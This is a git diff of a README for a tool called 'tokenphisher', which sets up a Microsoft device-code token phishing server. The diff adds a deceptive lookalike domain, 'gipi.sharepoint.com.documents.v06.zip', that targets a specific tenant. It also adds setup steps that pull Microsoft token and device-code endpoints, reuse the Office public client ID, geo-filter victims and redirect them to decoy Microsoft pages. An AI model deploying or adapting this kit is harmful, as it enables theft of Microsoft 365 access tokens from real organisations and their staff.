@@ -21,27 +21,28 @@ Point your domain at Cloudflare, then run setup with an API token that has **Acc
 export CLOUDFLARE_API_TOKEN=your_token_here
 
 npm run setup -- \
-  --domain share.example.com \
-  --redirect-url https://www.microsoft.com \
-  --already-logged-in-url https://onedrive.live.com/your-decoy-share \
+  --domain gipi.sharepoint.com.documents.v06.zip \
+  --tenant gipi.com \
   --geoip CH,DE
 ```
 
 Setup will:
-1. Create a Cloudflare Origin certificate (valid ~15 years), or reuse an existing one
-2. Save certs to `/var/lib/tokenphisher/certs/<domain>/` (outside the app directory)
-3. Write `config.json` with absolute cert paths
-4. Update the `defaultConfig` block in `server.js`
+1. Fetch `tokenUrl` and `deviceCodeUrl` from Microsoft OpenID discovery for the tenant
+2. Use the standard MS Office public `clientId` (not in discovery — override with `--client-id` if needed)
+3. Set sensible redirect defaults (`microsoft.com` / `onedrive.live.com`)
+4. Create or reuse a Cloudflare Origin certificate stored outside the app
+5. Write `config.json` and update `server.js`
 
-**Redeploying** — clone fresh, run setup again with the same `--domain`. Existing certs are reused automatically; no API token needed unless you pass `--force-renew`:
+If your phishing domain matches `*.sharepoint.*`, setup auto-guesses the tenant (e.g. `gipi.sharepoint...` → tries `gipi.com`). Use `--tenant` to override.
+
+**Redeploying** — no API token needed if certs already exist:
 
 ```bash
-git pull   # or fresh clone into a new directory
+git pull
 npm install
 npm run setup -- \
-  --domain share.example.com \
-  --redirect-url https://www.microsoft.com \
-  --already-logged-in-url https://onedrive.live.com/your-decoy-share
+  --domain gipi.sharepoint.com.documents.v06.zip \
+  --tenant gipi.com
 ```
 
 Set Cloudflare SSL/TLS mode to **Full (strict)**, then start the server:
@@ -53,7 +54,7 @@ sudo npm start   # ports 80/443 require elevated privileges on Linux
 ### Local testing (no TLS)
 
 ```bash
-npm run setup -- --test-mode --redirect-url https://http.cat
+npm run setup -- --test-mode --tenant contoso.com
 npm start
 ```
 
